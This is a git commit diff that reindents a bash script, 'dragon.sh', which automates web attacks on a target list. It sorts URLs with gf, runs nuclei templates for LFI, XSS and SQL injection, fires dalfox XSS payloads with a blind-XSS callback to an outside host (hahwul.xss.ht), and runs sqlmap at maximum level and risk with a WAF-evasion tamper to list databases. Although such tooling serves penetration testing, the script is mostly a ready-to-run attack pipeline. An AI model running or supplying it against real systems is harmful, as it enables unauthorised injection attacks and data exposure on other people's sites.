18d8aee61edf51e76436d6c5aaa7f688098580f4
j4xx3n <105862349+j4xx3n@users.noreply.github.com>
2024-06-23 11:25:33 -0500

    Update dragon.sh

--- dragon.sh
+++ dragon.sh
@@ -72,55 +72,55 @@ shift $((OPTIND -1))
 
 # Variable to make lists with gf
 gfListMaker() {
-    # Make directory for results
-    mkdir -p gfLists
-    cat $targetList | gf lfi | tee gfLists/lfiGF
-    cat $targetList | gf xss | tee gfLists/xssGF
-    cat $targetList | gf sqli | tee gfLists/sqliGF
+  # Make directory for results
+  mkdir -p gfLists
+  cat $targetList | gf lfi | tee gfLists/lfiGF
+  cat $targetList | gf xss | tee gfLists/xssGF
+  cat $targetList | gf sqli | tee gfLists/sqliGF
 }
 
 
 
 lfiAttack() {
-    cat gfLists/lfiGF | nuclei -tags lfi | tee -a Results/lfi
+  cat gfLists/lfiGF | nuclei -tags lfi | tee -a Results/lfi
 }
 
 
 xssAttack() {
-    dalfox -b hahwul.xss.ht file gfLists/xssGF | tee -a Results/xss
+  dalfox -b hahwul.xss.ht file gfLists/xssGF | tee -a Results/xss
 
-    cat gfLists/xssGF | nuclei -tags xss | tee -a Results/xss
+  cat gfLists/xssGF | nuclei -tags xss | tee -a Results/xss
 }
 
 
 sqliAttack() {
-    sqlmap -m gfLists/sqliGF --level 5 --risk 3 --batch --dbs --tamper=between | tee -a Results/sqli
+  sqlmap -m gfLists/sqliGF --level 5 --risk 3 --batch --dbs --tamper=between | tee -a Results/sqli
 
-    cat gfLists/sqliGF | nuclei -tags sqli | tee -a Results/sqli 
+  cat gfLists/sqliGF | nuclei -tags sqli | tee -a Results/sqli 
 }
 
 
 # Main function to call other functions
 main () {
-    if [ "$gfCall" = true ]; then
-      gfListMaker
-    fi
+  if [ "$gfCall" = true ]; then
+    gfListMaker
+  fi
 
-    if [ "$lfiCall" = true ]; then
-      lfiAttack
-    fi
+  if [ "$lfiCall" = true ]; then
+    lfiAttack
+  fi
 
-    if [ "$xssCall" = true ]; then
-      xssAttack
-    fi
+  if [ "$xssCall" = true ]; then
+    xssAttack
+  fi
 
-    if [ "$sqliCall" = true ]; then
-      sqliAttack
-    fi
-    if [ "$allCall" = true ]; then
-      lfiAttack
-      xssAttack
-      sqliAttack
-    fi
+  if [ "$sqliCall" = true ]; then
+    sqliAttack
+  fi
+  if [ "$allCall" = true ]; then
+    lfiAttack
+    xssAttack
+    sqliAttack
+  fi
 }
 main
